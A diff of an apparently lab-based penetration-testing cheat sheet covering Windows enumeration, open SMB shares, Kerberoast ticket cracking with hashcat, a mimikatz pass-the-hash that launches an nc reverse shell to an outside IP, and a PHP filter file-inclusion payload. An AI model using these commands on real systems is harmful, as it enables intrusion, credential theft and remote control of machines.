@@ -225,6 +225,14 @@ $ ss -tuln4 | grep LISTEN | grep -v 127.0.0.1 | wc -l
 # one line
 PS> powershell -nop -c "powershell command; powershell command...;"
 PS> powershell -command "Start-Process -Verb runas cmd"
+# check user
+PS> whoami /user
+# check OS
+PS> wmic os list brief
+# find a specific folder
+PS> tree c:\
+PS> tree c:\ /f | more
+PS> tree c:\ /f | Select-String "TestString" -context 20, 10
 # Enumerating Security Controls
 PS> Get-MpComputerStatus
 PS> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
@@ -269,6 +277,10 @@ PS> Get-Service -Name HogeService | fl
 # Share
 PS> Get-WmiObject Win32_Share | Select-Object Name, Path
 PS> Get-SmbShare | Select-Object Name, Path
+PS> New-Item -ItemType Directory -Path .\"TestShareFolder"
+PS> New-SmbShare -Path .\ -Name "TestShareFolder"
+PS> New-SmbShare -Path c:\ -Name "TestShareFolder" -FullAccess 'Everyone'
+PS> New-SmbShare -Path C:\Users\TestUser\"TestShareFolder" -Name "TestShareFolder" -FullAccess 'Everyone'
 # Shell
 PS> $username = 'TestUser'
 PS> $password = 'TestPassword'
@@ -372,20 +384,14 @@ download C:\\Users\\t1_trevor.jones\\Documents\\PasswordDatabase.kdbx /root
 ```
 
 
-
 Windows Version
 Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
-
-tree c:\
-tree c:\ /f | more
-tree c:\ /f | Select-String "flag" -context 20, 10
 
 File System
 NTFS
 icacls
 icacls c:\windows
 icacls c:\users
-
 
 
 
@@ -403,21 +409,7 @@ Get-Alias | Where-Object { $_.Name -like '*ipconfig*' }
 
 Get-ExecutionPolicy -List
 
-- WMI
-wmic os list brief
 
-whoami /user
-
-
-
-tree c:\ /f | Select-String "Company" -context 20, 10
-
-
-
-New-SmbShare -Path c:\ -Name "Company Data" -FullAccess 'Everyone'
-
-
-New-Item -ItemType Directory -Path .\"Company Data"
 
 icacls .\"Company Data"
 New-SmbShare -Path .\ -Name "Company Data"
@@ -610,16 +602,6 @@ mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.T
 mimikatz# sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.65.31 5556"
 ```
 
-```zsh
-$ echo "dsaffadsfdsafsf==" | tr -d \\n < result.txt
-$ cat result.txt | base64 -d > sqldev.kirbi
-$ pa2
-$ python ./kirbi2john.py sqldev.kirbi
-$ cat crack_file
-$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
-$ cat sqldev_tgs_hashcat
-$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
-```
 
 # DCSync
 ```ps
@@ -776,6 +758,16 @@ C:/ProgramDara/McAfee/Agent/DB/ma.db
 ```
 
 # Story
+```zsh
+$ echo "dsaffadsfdsafsf==" | tr -d \\n < result.txt
+$ cat result.txt | base64 -d > sqldev.kirbi
+$ pa2
+$ python ./kirbi2john.py sqldev.kirbi
+$ cat crack_file
+$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+$ cat sqldev_tgs_hashcat
+$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+```
 ```zsh
 $ http://XXX.XXX.XXX.XXX:RPORT/index.php?page=php://filter/read=convert.base64-encode/resource=index
 $ echo "~~~" | base64 -d | grep ".php"
